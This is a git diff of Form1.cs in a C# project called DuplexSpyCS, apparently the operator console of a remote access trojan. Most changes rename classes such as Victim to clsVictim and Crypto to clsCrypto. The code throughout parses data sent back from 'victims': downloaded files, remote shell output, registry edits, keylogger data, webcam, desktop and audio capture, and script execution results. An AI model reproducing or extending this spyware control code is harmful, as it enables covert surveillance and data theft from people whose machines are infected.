@@ -11,7 +11,7 @@ namespace DuplexSpyCS
 {
     public partial class Form1 : Form
     {
-        public Listener listener;
+        public clsTcpListener listener;
 
         ColorStyleMode color_style = ColorStyleMode.LightMode;
 
@@ -23,7 +23,9 @@ namespace DuplexSpyCS
         /// <summary>
         /// Store class StreamWriter of file transfer.
         /// </summary>
-        public static Dictionary<string, FilePacketWriter> g_FilePacketWriter = new Dictionary<string, FilePacketWriter>();
+        public static Dictionary<string, clsFilePacketWriter> g_FilePacketWriter = new Dictionary<string, clsFilePacketWriter>();
+
+        public Dictionary<string, clsListener> m_dicListener = new Dictionary<string, clsListener>();
 
         public Form1()
         {
@@ -34,18 +36,18 @@ namespace DuplexSpyCS
         /// Return a list of victim from listview selected items.
         /// </summary>
         /// <returns></returns>
-        private List<Victim> fnlsGetSelectedVictims()
+        private List<clsVictim> fnlsGetSelectedVictims()
         {
-            List<Victim> lsVictim = new List<Victim>();
+            List<clsVictim> lsVictim = new List<clsVictim>();
             foreach (ListViewItem item in listView1.SelectedItems)
                 lsVictim.Add(GetVictim(item));
 
             return lsVictim;
         }
 
-        public List<Victim> GetAllVictim()
+        public List<clsVictim> GetAllVictim()
         {
-            List<Victim> lsVictim = new List<Victim>();
+            List<clsVictim> lsVictim = new List<clsVictim>();
             Invoke(new Action(() =>
             {
                 foreach (ListViewItem item in listView1.Items)
@@ -57,8 +59,8 @@ namespace DuplexSpyCS
 
         public void ColorStyle(ColorStyleMode style, Form f = null)
         {
-            Color backcolor = C3.dic_ColorModeStylee[style]["back"];
-            Color forecolor = C3.dic_ColorModeStylee[style]["fore"];
+            Color backcolor = clsGlobal.dic_ColorModeStylee[style]["back"];
+            Color forecolor = clsGlobal.dic_ColorModeStylee[style]["fore"];
 
             List<Form> l_form = new List<Form>();
             if (f == null)
@@ -122,7 +124,7 @@ namespace DuplexSpyCS
         /// </summary>
         /// <param name="v">Class Victim</param>
         /// <returns></returns>
-        int MakeNewPortfolio(Victim v)
+        int MakeNewPortfolio(clsVictim v)
         {
             try
             {
@@ -177,7 +179,7 @@ namespace DuplexSpyCS
         /// <param name="v">Class Victim</param>
         /// <param name="buffer">Payload</param>
         /// <param name="rec">Buffer length</param>
-        void Received(Listener l, Victim v, string[] cmd)
+        void Received(clsTcpListener l, clsVictim v, string[] cmd)
         {
             try
             {
@@ -200,7 +202,7 @@ namespace DuplexSpyCS
                             item.SubItems.Add(cmd[4]); //OS
                             for (int i = 5; i < 9; i++)
                                 item.SubItems.Add(cmd[i]);
-                            item.SubItems.Add(Crypto.b64D2Str(cmd[9]));
+                            item.SubItems.Add(clsCrypto.b64D2Str(cmd[9]));
                             item.Tag = v;
                             item.ImageKey = v.ID;
 
@@ -214,14 +216,14 @@ namespace DuplexSpyCS
 
                             MakeNewPortfolio(v);
 
-                            C2.sql_conn.NewVictim(v, v.remoteOS, v.socket.RemoteEndPoint.ToString());
-                            C2.sql_conn.WriteSystemLogs($"New accessible client: {online_id}({cmd[4]})"); //Write system log.
+                            clsStore.sql_conn.NewVictim(v, v.remoteOS, v.socket.RemoteEndPoint.ToString());
+                            clsStore.sql_conn.WriteSystemLogs($"New accessible client: {online_id}({cmd[4]})"); //Write system log.
                         }
                         else
                         {
                             x.SubItems[6].Text = v.latency_time.ToString() + " ms";
                             x.SubItems[7].Text = cmd[6];
-                            x.SubItems[10].Text = Crypto.b64D2Str(cmd[9]);
+                            x.SubItems[10].Text = clsCrypto.b64D2Str(cmd[9]);
 
                             int width = 0;
                             Invoke(new Action(() => width = listView1.Columns[0].Width));
@@ -231,7 +233,7 @@ namespace DuplexSpyCS
                             if (width > 256)
                                 width = 255;
                             il_screen.ImageSize = new Size(width, width);
-                            Image img = C1.Base64ToImage(cmd[10]);
+                            Image img = clsTools.Base64ToImage(cmd[10]);
                             il_screen.Images.Add(v.ID, img);
                             v.img_LastDesktop = img;
 
@@ -261,7 +263,7 @@ namespace DuplexSpyCS
                 {
                     if (cmd[1] == "client")
                     {
-                        frmClientConfig f = (frmClientConfig)C1.GetFormByVictim(v, Function.ClientConfig);
+                        frmClientConfig f = (frmClientConfig)clsTools.GetFormByVictim(v, Function.ClientConfig);
                         if (f == null)
                             return;
 
@@ -300,7 +302,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "pc")
                     {
-                        frmInfo f = (frmInfo)C1.GetFormByVictim(v, Function.Information);
+                        frmInfo f = (frmInfo)clsTools.GetFormByVictim(v, Function.Information);
                         if (f == null)
                             return;
 
@@ -308,7 +310,7 @@ namespace DuplexSpyCS
                         {
                             if (cmd[3] == "basic")
                             {
-                                f.ShowInfo(Crypto.b64D2Str(cmd[4]));
+                                f.ShowInfo(clsCrypto.b64D2Str(cmd[4]));
                             }
                             else if (cmd[3] == "patch")
                             {
@@ -340,8 +342,8 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "file")
                 {
-                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
-                    frmFileTransferState ft = (frmFileTransferState)C1.GetFormByVictim(v, Function.TransferFileState);
+                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
+                    frmFileTransferState ft = (frmFileTransferState)clsTools.GetFormByVictim(v, Function.TransferFileState);
                     if (f == null && ft == null)
                     {
                         return;
@@ -355,7 +357,7 @@ namespace DuplexSpyCS
                     {
                         if (cmd[2] == "error")
                         {
-                            MessageBox.Show(Crypto.b64D2Str(cmd[3]), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            MessageBox.Show(clsCrypto.b64D2Str(cmd[3]), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             return;
                         }
 
@@ -364,7 +366,7 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "goto")
                     {
                         int code = int.Parse(cmd[2]);
-                        string msg = Crypto.b64D2Str(cmd[3]);
+                        string msg = clsCrypto.b64D2Str(cmd[3]);
 
                         f.FileGoto(code, msg);
                     }
@@ -378,7 +380,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "uf") //UPLOAD FILE
                     {
-                        frmFileTransferState f_state = (frmFileTransferState)C1.GetFormByVictim(v, Function.TransferFileState);
+                        frmFileTransferState f_state = (frmFileTransferState)clsTools.GetFormByVictim(v, Function.TransferFileState);
                         if (f_state == null || f_state.transfer_type != TransferFileType.Upload)
                         {
                             f_state = null;
@@ -387,7 +389,7 @@ namespace DuplexSpyCS
 
                         if (cmd[2] == "state")
                         {
-                            string file = Crypto.b64D2Str(cmd[3]);
+                            string file = clsCrypto.b64D2Str(cmd[3]);
                             string percentage = cmd[4];
 
                             if (f_state != null)
@@ -403,8 +405,8 @@ namespace DuplexSpyCS
                             }
                             else if (cmd[3] == "one") //SKIP SPECIFIED
                             {
-                                string file = Crypto.b64D2Str(cmd[4]);
-                                string msg = Crypto.b64D2Str(cmd[5]);
+                                string file = clsCrypto.b64D2Str(cmd[4]);
+                                string msg = clsCrypto.b64D2Str(cmd[5]);
                                 if (f_state != null)
                                 {
                                     f_state.UpdateState(file, msg);
@@ -420,16 +422,16 @@ namespace DuplexSpyCS
                     {
                         if (cmd[2] == "recv")
                         {
-                            string remote_file = Crypto.b64D2Str(cmd[3]); //THIS IS THE REMOTE FILE PATH, WE NEED TO PROCESS IT, SAVE IT INTO VICTIM FOLDER
+                            string remote_file = clsCrypto.b64D2Str(cmd[3]); //THIS IS THE REMOTE FILE PATH, WE NEED TO PROCESS IT, SAVE IT INTO VICTIM FOLDER
                             string tgt_file = Path.Combine(new string[] { v.dir_victim, "Downloads", Path.GetFileName(remote_file) });
                             long file_len = long.Parse(cmd[4]);
                             int offset = int.Parse(cmd[5]);
                             byte[] file_buffer = Convert.FromBase64String(cmd[6]);
 
                             if (!g_FilePacketWriter.ContainsKey(tgt_file))
-                                g_FilePacketWriter.Add(tgt_file, new FilePacketWriter(tgt_file, remote_file, file_len, v));
+                                g_FilePacketWriter.Add(tgt_file, new clsFilePacketWriter(tgt_file, remote_file, file_len, v));
 
-                            FilePacketWriter writer = g_FilePacketWriter[tgt_file];
+                            clsFilePacketWriter writer = g_FilePacketWriter[tgt_file];
                             writer.EnqueuePacket(offset, file_buffer);
                         }
                         else if (cmd[2] == "err") //ERROR
@@ -464,14 +466,14 @@ namespace DuplexSpyCS
                             }
                             else
                             {
-                                string msg = Crypto.b64D2Str(cmd[4]);
+                                string msg = clsCrypto.b64D2Str(cmd[4]);
                                 MessageBox.Show(msg, "Error - New Folder", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             }
                         }
                     }
                     else if (cmd[1] == "paste")
                     {
-                        frmFilePaste _f = (frmFilePaste)C1.GetFormByVictim(v, Function.FilePaste);
+                        frmFilePaste _f = (frmFilePaste)clsTools.GetFormByVictim(v, Function.FilePaste);
                         if (_f == null)
                             return;
                         else
@@ -479,12 +481,12 @@ namespace DuplexSpyCS
 
                         List<string[]> func(string data)
                         {
-                            return data.Split(',').Select(x => Crypto.b64D2Str(x).Split('|')).Select(x => new string[]
+                            return data.Split(',').Select(x => clsCrypto.b64D2Str(x).Split('|')).Select(x => new string[]
                             {
                                 x[0],
                                 x[1],
-                                Crypto.b64D2Str(x[2]),
-                                Crypto.b64D2Str(x[3]),
+                                clsCrypto.b64D2Str(x[2]),
+                                clsCrypto.b64D2Str(x[3]),
                             }).ToList();
                         }
 
@@ -494,7 +496,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "del")
                     {
-                        frmFileDelState _f = (frmFileDelState)C1.GetFormByVictim(v, Function.FileDelState);
+                        frmFileDelState _f = (frmFileDelState)clsTools.GetFormByVictim(v, Function.FileDelState);
                         if (_f == null)
                             return;
                         else
@@ -505,8 +507,8 @@ namespace DuplexSpyCS
                             return data.Split(',').Select(x => x.Split(';')).Select(x => new string[]
                             {
                                 x[0], //CODE
-                                Crypto.b64D2Str(x[1]), //PATH
-                                string.IsNullOrEmpty(x[2]) ? string.Empty : Crypto.b64D2Str(x[2]) //MESSAGE
+                                clsCrypto.b64D2Str(x[1]), //PATH
+                                string.IsNullOrEmpty(x[2]) ? string.Empty : clsCrypto.b64D2Str(x[2]) //MESSAGE
                             }).ToList();
                         }
 
@@ -517,7 +519,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "zip")
                     {
-                        frmFileArchive af = (frmFileArchive)C1.GetFormByVictim(v, Function.FileArchive);
+                        frmFileArchive af = (frmFileArchive)clsTools.GetFormByVictim(v, Function.FileArchive);
                         if (af == null)
                             return;
 
@@ -526,43 +528,43 @@ namespace DuplexSpyCS
 
                         if (!string.IsNullOrEmpty(cmd[2]))
                             dInfo = cmd[2].Split(',')
-                                .Select(x => Crypto.b64D2Str(x))
+                                .Select(x => clsCrypto.b64D2Str(x))
                                 .Select(x => x.Split('|'))
-                                .Select(x => new string[] { Crypto.b64D2Str(x[0]), x[1] })
+                                .Select(x => new string[] { clsCrypto.b64D2Str(x[0]), x[1] })
                                 .ToList();
 
                         if (!string.IsNullOrEmpty(cmd[3]))
                             fInfo = cmd[3].Split(',')
-                                .Select(x => Crypto.b64D2Str(x))
+                                .Select(x => clsCrypto.b64D2Str(x))
                                 .Select(x => x.Split('|'))
-                                .Select(x => new string[] { Crypto.b64D2Str(x[0]), x[1] })
+                                .Select(x => new string[] { clsCrypto.b64D2Str(x[0]), x[1] })
                                 .ToList();
 
                         af.ShowState(ArchiveAction.Compress, dInfo, fInfo, cmd[4]);
                     }
                     else if (cmd[1] == "unzip")
                     {
-                        frmFileArchive af = (frmFileArchive)C1.GetFormByVictim(v, Function.FileArchive);
+                        frmFileArchive af = (frmFileArchive)clsTools.GetFormByVictim(v, Function.FileArchive);
                         if (af == null)
                             return;
 
                         List<string[]> aInfo = cmd[2].Split(',')
-                            .Select(x => Crypto.b64D2Str(x))
+                            .Select(x => clsCrypto.b64D2Str(x))
                             .Select(x => x.Split('|'))
-                            .Select(x => new string[] { Crypto.b64D2Str(x[0]), x[1] })
+                            .Select(x => new string[] { clsCrypto.b64D2Str(x[0]), x[1] })
                             .ToList();
 
                         af.ShowState(ArchiveAction.Extract, aInfo, null);
                     }
                     else if (cmd[1] == "find")
                     {
-                        frmFileFind ff = (frmFileFind)C1.GetFormByVictim(v, Function.FileFind);
+                        frmFileFind ff = (frmFileFind)clsTools.GetFormByVictim(v, Function.FileFind);
                         if (ff == null)
                             return;
 
                         List<(string, string, string)> results = cmd[2].Split(';')
                             .Select(x => x.Split(','))
-                            .Select(x => new string[] { x[0], Crypto.b64D2Str(x[1]) })
+                            .Select(x => new string[] { x[0], clsCrypto.b64D2Str(x[1]) })
                             .Select(x => (Path.GetFileName(x[1]), x[0] == "d" ? "Directory" : "File", x[1]))
                             .ToList();
 
@@ -573,8 +575,8 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "wget")
                     {
-                        string szUrl = Crypto.b64D2Str(cmd[3]);
-                        string szSavePath = Crypto.b64D2Str(cmd[4]);
+                        string szUrl = clsCrypto.b64D2Str(cmd[3]);
+                        string szSavePath = clsCrypto.b64D2Str(cmd[4]);
 
                         if (cmd[2] == "progress")
                         {
@@ -586,7 +588,7 @@ namespace DuplexSpyCS
                         else if (cmd[2] == "status")
                         {
                             int code = int.Parse(cmd[5]);
-                            string msg = Crypto.b64D2Str(cmd[6]);
+                            string msg = clsCrypto.b64D2Str(cmd[6]);
 
                             f.File_WgetUpdate(szUrl, szSavePath, code, msg);
                         }
@@ -594,7 +596,7 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "ts")
                     {
                         int nCode = int.Parse(cmd[2]);
-                        string szMsg = Crypto.b64D2Str(cmd[3]);
+                        string szMsg = clsCrypto.b64D2Str(cmd[3]);
 
                         if (nCode == 0)
                         {
@@ -607,7 +609,7 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "sc") //ShortCut
                     {
                         int nCode = int.Parse(cmd[2]);
-                        string szMsg = Crypto.b64D2Str(cmd[3]);
+                        string szMsg = clsCrypto.b64D2Str(cmd[3]);
 
                         if (nCode == 0)
                         {
@@ -624,7 +626,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "task")
                 {
-                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
+                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                     if (f == null)
                         return;
 
@@ -634,14 +636,14 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "start")
                     {
-                        string szFileName = Crypto.b64D2Str(cmd[2]);
-                        string szArgv = Crypto.b64D2Str(cmd[3]);
-                        string szWorkDir = Crypto.b64D2Str(cmd[4]);
+                        string szFileName = clsCrypto.b64D2Str(cmd[2]);
+                        string szArgv = clsCrypto.b64D2Str(cmd[3]);
+                        string szWorkDir = clsCrypto.b64D2Str(cmd[4]);
                         int code = int.Parse(cmd[4]);
 
                         if (code == 0)
                         {
-                            string msg = Crypto.b64D2Str(cmd[5]);
+                            string msg = clsCrypto.b64D2Str(cmd[5]);
                             MessageBox.Show(msg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                         }
                         else
@@ -658,7 +660,7 @@ namespace DuplexSpyCS
                             .Select(x => new string[]
                             {
                                 x[0],
-                                int.Parse(x[1]) == 0 ? Crypto.b64D2Str(cmd[2]) : "OK"
+                                int.Parse(x[1]) == 0 ? clsCrypto.b64D2Str(cmd[2]) : "OK"
                             })
                             .ToList();
 
@@ -676,7 +678,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "reg") //RegEdit
                 {
-                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
+                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                     if (f == null)
                         return;
 
@@ -690,12 +692,12 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "goto")
                     {
-                        f.Reg_Goto(Crypto.b64D2Str(cmd[2]), cmd[3]);
+                        f.Reg_Goto(clsCrypto.b64D2Str(cmd[2]), cmd[3]);
                     }
                     else if (cmd[1] == "add")
                     {
                         int code = int.Parse(cmd[3]);
-                        string msg = Crypto.b64D2Str(cmd[4]);
+                        string msg = clsCrypto.b64D2Str(cmd[4]);
 
                         if (cmd[2] == "key")
                         {
@@ -709,7 +711,7 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "rename")
                     {
                         int code = int.Parse(cmd[3]);
-                        string msg = Crypto.b64D2Str(cmd[4]);
+                        string msg = clsCrypto.b64D2Str(cmd[4]);
 
                         if (cmd[2] == "key")
                         {
@@ -723,7 +725,7 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "del")
                     {
                         int code = int.Parse(cmd[3]);
-                        string msg = Crypto.b64D2Str(cmd[4]);
+                        string msg = clsCrypto.b64D2Str(cmd[4]);
                         bool bKey = cmd[2] == "key";
 
                         switch (code)
@@ -734,7 +736,7 @@ namespace DuplexSpyCS
                             case 1:
                                 MessageBox.Show($"Delete {(bKey ? "key" : "value")} successfully.", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
 
-                                frmManager f_mgr = (frmManager)C1.GetFormByVictim(v, Function.Manager);
+                                frmManager f_mgr = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                                 if (f_mgr == null)
                                     return;
 
@@ -745,14 +747,14 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "find")
                     {
-                        frmRegFind ff = (frmRegFind)C1.GetFormByVictim(v, Function.RegFind);
+                        frmRegFind ff = (frmRegFind)clsTools.GetFormByVictim(v, Function.RegFind);
                         if (ff == null)
                             return;
 
                         List<(string, string)> lsKey = new List<(string, string)>();
                         List<(string, string)> lsVal = new List<(string, string)>();
 
-                        foreach (var x in cmd[2].Split(',').Select(y => y.Split(';')).Select(y => (y[0], Crypto.b64D2Str(y[1]), Crypto.b64D2Str(y[2]))))
+                        foreach (var x in cmd[2].Split(',').Select(y => y.Split(';')).Select(y => (y[0], clsCrypto.b64D2Str(y[1]), clsCrypto.b64D2Str(y[2]))))
                         {
                             if (x.Item1 == "k")
                                 lsKey.Add(("Directory", x.Item2));
@@ -765,8 +767,8 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "export")
                     {
                         int code = int.Parse(cmd[2]);
-                        string msg = Crypto.b64D2Str(cmd[3]);
-                        string savePath = Crypto.b64D2Str(cmd[4]);
+                        string msg = clsCrypto.b64D2Str(cmd[3]);
+                        string savePath = clsCrypto.b64D2Str(cmd[4]);
 
                         if (code == 0)
                         {
@@ -804,8 +806,8 @@ namespace DuplexSpyCS
                     else if (cmd[1] == "import")
                     {
                         int code = int.Parse(cmd[2]);
-                        string msg = Crypto.b64D2Str(cmd[3]);
-                        string saveRemotePath = Crypto.b64D2Str(cmd[4]);
+                        string msg = clsCrypto.b64D2Str(cmd[3]);
+                        string saveRemotePath = clsCrypto.b64D2Str(cmd[4]);
                     }
                 }
 
@@ -814,7 +816,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "serv")
                 {
-                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
+                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                     if (f == null)
                         return;
 
@@ -829,7 +831,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "conn")
                 {
-                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
+                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                     if (f == null)
                         return;
 
@@ -844,7 +846,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "window")
                 {
-                    frmManager f = (frmManager)C1.GetFormByVictim(v, Function.Manager);
+                    frmManager f = (frmManager)clsTools.GetFormByVictim(v, Function.Manager);
                     if (f == null)
                         return;
 
@@ -853,7 +855,7 @@ namespace DuplexSpyCS
                         int code = int.Parse(cmd[2]);
                         if (code == 0)
                         {
-                            string msg = Crypto.b64D2Str(cmd[3]);
+                            string msg = clsCrypto.b64D2Str(cmd[3]);
                             MessageBox.Show(msg, "Manager - GetWindow Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             return;
                         }
@@ -875,9 +877,9 @@ namespace DuplexSpyCS
 
                             WindowInfo info = new WindowInfo()
                             {
-                                szTitle = Crypto.b64D2Str(split[0]),
+                                szTitle = clsCrypto.b64D2Str(split[0]),
                                 iWindow = iWindow,
-                                szFilePath = Crypto.b64D2Str(split[2]),
+                                szFilePath = clsCrypto.b64D2Str(split[2]),
                                 szProcessName = split[3],
                                 nProcessId = int.Parse(split[4]),
                                 nHandle = int.Parse(split[5]),
@@ -894,12 +896,12 @@ namespace DuplexSpyCS
                         int code = int.Parse(cmd[3]);
                         if (code == 0)
                         {
-                            string msg = Crypto.b64D2Str(cmd[4]);
+                            string msg = clsCrypto.b64D2Str(cmd[4]);
                             MessageBox.Show(msg, "CaptureWindow() error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                             return;
                         }
 
-                        Image img = C1.Base64ToImage(cmd[5]);
+                        Image img = clsTools.Base64ToImage(cmd[5]);
                         f.Window_ShowScreenshot(cmd[2], img);
                     }
                 }
@@ -909,7 +911,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "system")
                 {
-                    frmSystem f = (frmSystem)C1.GetFormByVictim(v, Function.System);
+                    frmSystem f = (frmSystem)clsTools.GetFormByVictim(v, Function.System);
                     if (f == null)
                         return;
 
@@ -917,14 +919,14 @@ namespace DuplexSpyCS
                     {
                         if (cmd[2] == "init")
                         {
-                            List<string[]> apps = cmd[3].Split(',').Select(x => x.Split(';').Select(y => Crypto.b64D2Str(y)).ToArray()).ToList();
+                            List<string[]> apps = cmd[3].Split(',').Select(x => x.Split(';').Select(y => clsCrypto.b64D2Str(y)).ToArray()).ToList();
                             f.App_ShowApps(apps);
                         }
                     }
                     else if (cmd[1] == "ev") //ENVIRONMENT VARIABLES
                     {
                         int code = int.Parse(cmd[3]);
-                        string msg = Crypto.b64D2Str(cmd[4]);
+                        string msg = clsCrypto.b64D2Str(cmd[4]);
 
                         if (code == 0)
                         {
@@ -937,7 +939,7 @@ namespace DuplexSpyCS
 
                             List<(string, EnvironmentVariableTarget, string)> s = cmd[5].Split(';')
                                 .Select(x => x.Split(','))
-                                .Select(x => (x[0], (EnvironmentVariableTarget)Enum.Parse(typeof(EnvironmentVariableTarget), x[1]), Crypto.b64D2Str(x[2])))
+                                .Select(x => (x[0], (EnvironmentVariableTarget)Enum.Parse(typeof(EnvironmentVariableTarget), x[1]), clsCrypto.b64D2Str(x[2])))
                                 .ToList();
 
                             f.EV_ShowEVs(s);
@@ -951,13 +953,13 @@ namespace DuplexSpyCS
                     {
                         if (cmd[2] == "init")
                         {
-                            List<string[]> devices = cmd[3].Split(',').Select(x => x.Split(';').Select(y => Crypto.b64D2Str(y)).ToArray()).ToList();
+                            List<string[]> devices = cmd[3].Split(',').Select(x => x.Split(';').Select(y => clsCrypto.b64D2Str(y)).ToArray()).ToList();
                             f.Device_ShowDevices(devices);
                         }
                         else if (cmd[2] == "info")
                         {
                             int code = int.Parse(cmd[3]);
-                            string msg = Crypto.b64D2Str(cmd[4]);
+                            string msg = clsCrypto.b64D2Str(cmd[4]);
                             string payload = cmd[5];
 
                             List<Tuple<string, string>> lsInfo = new List<Tuple<string, string>>();
@@ -974,7 +976,7 @@ namespace DuplexSpyCS
                     {
                         if (cmd[2] == "init")
                         {
-                            List<string[]> interfaces = cmd[3].Split(',').Select(x => x.Split(';').Select(y => Crypto.b64D2Str(y)).ToArray()).ToList();
+                            List<string[]> interfaces = cmd[3].Split(',').Select(x => x.Split(';').Select(y => clsCrypto.b64D2Str(y)).ToArray()).ToList();
                             f.If_ShowInterface(interfaces);
                         }
                     }
@@ -985,7 +987,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "shell")
                 {
-                    frmShell f = (frmShell)C1.GetFormByVictim(v, Function.Shell);
+                    frmShell f = (frmShell)clsTools.GetFormByVictim(v, Function.Shell);
                     if (f == null)
                         return;
 
@@ -996,7 +998,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "tab")
                     {
-                        string text = Crypto.b64D2Str(cmd[2]);
+                        string text = clsCrypto.b64D2Str(cmd[2]);
                         f.ProcessTab(text);
                     }
                 }
@@ -1006,7 +1008,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "wmi")
                 {
-                    frmWMI f = (frmWMI)C1.GetFormByVictim(v, Function.WMI);
+                    frmWMI f = (frmWMI)clsTools.GetFormByVictim(v, Function.WMI);
                     if (f == null)
                         return;
 
@@ -1025,7 +1027,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "desktop")
                 {
-                    frmDesktop f = (frmDesktop)C1.GetFormByVictim(v, Function.Desktop);
+                    frmDesktop f = (frmDesktop)clsTools.GetFormByVictim(v, Function.Desktop);
                     if (f == null)
                         return;
                     if (cmd[1] == "init")
@@ -1043,7 +1045,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "webcam")
                 {
-                    frmWebcam f = (frmWebcam)C1.GetFormByVictim(v, Function.Webcam);
+                    frmWebcam f = (frmWebcam)clsTools.GetFormByVictim(v, Function.Webcam);
                     if (f == null)
                         return;
 
@@ -1070,7 +1072,7 @@ namespace DuplexSpyCS
                     {
                         string szBase64Image = cmd[2];
                         string szDatetime = cmd[3];
-                        v.img_LastWebcam = C1.Base64ToImage(szBase64Image);
+                        v.img_LastWebcam = clsTools.Base64ToImage(szBase64Image);
                     }
                 }
 
@@ -1079,7 +1081,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "keylogger")
                 {
-                    frmKeyLogger f = (frmKeyLogger)C1.GetFormByVictim(v, Function.KeyLogger);
+                    frmKeyLogger f = (frmKeyLogger)clsTools.GetFormByVictim(v, Function.KeyLogger);
                     if (f == null)
                         return;
 
@@ -1102,7 +1104,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "chat")
                 {
-                    frmChat f = (frmChat)C1.GetFormByVictim(v, Function.Chat);
+                    frmChat f = (frmChat)clsTools.GetFormByVictim(v, Function.Chat);
                     if (f == null)
                         return;
 
@@ -1116,7 +1118,7 @@ namespace DuplexSpyCS
                     }
                     else if (cmd[1] == "msg")
                     {
-                        f.ShowMsg(v.ID, Crypto.b64D2Str(cmd[2]));
+                        f.ShowMsg(v.ID, clsCrypto.b64D2Str(cmd[2]));
                     }
                     else if (cmd[1] == "close")
                     {
@@ -1129,7 +1131,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "audio")
                 {
-                    frmAudio f = (frmAudio)C1.GetFormByVictim(v, Function.Audio);
+                    frmAudio f = (frmAudio)clsTools.GetFormByVictim(v, Function.Audio);
                     if (f == null)
                         return;
 
@@ -1138,8 +1140,8 @@ namespace DuplexSpyCS
                         string szPayloadMic = cmd[2];
                         string szPayloadSys = cmd[3];
 
-                        List<(int, string)> lsMic = szPayloadMic.Split(';').Select(x => x.Split(',')).Select(x => (int.Parse(x[0]), Crypto.b64D2Str(x[1]))).ToList();
-                        List<(int, string)> lsSys = szPayloadSys.Split(';').Select(x => x.Split(',')).Select(x => (int.Parse(x[0]), Crypto.b64D2Str(x[1]))).ToList();
+                        List<(int, string)> lsMic = szPayloadMic.Split(';').Select(x => x.Split(',')).Select(x => (int.Parse(x[0]), clsCrypto.b64D2Str(x[1]))).ToList();
+                        List<(int, string)> lsSys = szPayloadSys.Split(';').Select(x => x.Split(',')).Select(x => (int.Parse(x[0]), clsCrypto.b64D2Str(x[1]))).ToList();
 
                         f.Init(lsMic, lsSys);
                     }
@@ -1187,7 +1189,7 @@ namespace DuplexSpyCS
                                         return;
 
                                     int code = int.Parse(cmd[6]);
-                                    string msg = Crypto.b64D2Str(cmd[7]);
+                                    string msg = clsCrypto.b64D2Str(cmd[7]);
 
                                     if (code == 0)
                                     {
@@ -1216,7 +1218,7 @@ namespace DuplexSpyCS
                                         return;
 
                                     int code = int.Parse(cmd[6]);
-                                    string msg = Crypto.b64D2Str(cmd[7]);
+                                    string msg = clsCrypto.b64D2Str(cmd[7]);
 
                                     if (code == 0)
                                     {
@@ -1238,12 +1240,12 @@ namespace DuplexSpyCS
                 {
                     if (new string[] { "bat", "cs", "vb" }.Contains(cmd[1]))
                     {
-                        frmRunScript f = (frmRunScript)C1.GetFormByVictim(v, Function.RunScript);
+                        frmRunScript f = (frmRunScript)clsTools.GetFormByVictim(v, Function.RunScript);
                         if (f == null)
                             return;
 
                         int code = int.Parse(cmd[2]);
-                        string output = Crypto.b64D2Str(cmd[3]);
+                        string output = clsCrypto.b64D2Str(cmd[3]);
 
                         f.DisplayOutput(code, output);
                     }
@@ -1256,7 +1258,7 @@ namespace DuplexSpyCS
                                 frmInfoBox f = new frmInfoBox();
                                 f.Show();
 
-                                f.ShowInfo(Crypto.b64D2Str(cmd[3]), "Output", SystemIcons.Information);
+                                f.ShowInfo(clsCrypto.b64D2Str(cmd[3]), "Output", SystemIcons.Information);
                             }));
                         }
                     }
@@ -1267,7 +1269,7 @@ namespace DuplexSpyCS
 
                 else if (cmd[0] == "fun")
                 {
-                    frmFunStuff f = (frmFunStuff)C1.GetFormByVictim(v, Function.FunStuff);
+                    frmFunStuff f = (frmFunStuff)clsTools.GetFormByVictim(v, Function.FunStuff);
                     if (f == null)
                         return;
                     if (cmd[1] == "screen")
@@ -1290,7 +1292,7 @@ namespace DuplexSpyCS
                         if (cmd[2] == "set")
                         {
                             int code = int.Parse(cmd[3]);
-                            string msg = Crypto.b64D2Str(cmd[4]);
+                            string msg = clsCrypto.b64D2Str(cmd[4]);
 
                             if (code == 0)
                             {
@@ -1306,7 +1308,7 @@ namespace DuplexSpyCS
 
                             if (code == 1)
                             {
-                                Image img = C1.Base64ToImage(szB64Img);
+                                Image img = clsTools.Base64ToImage(szB64Img);
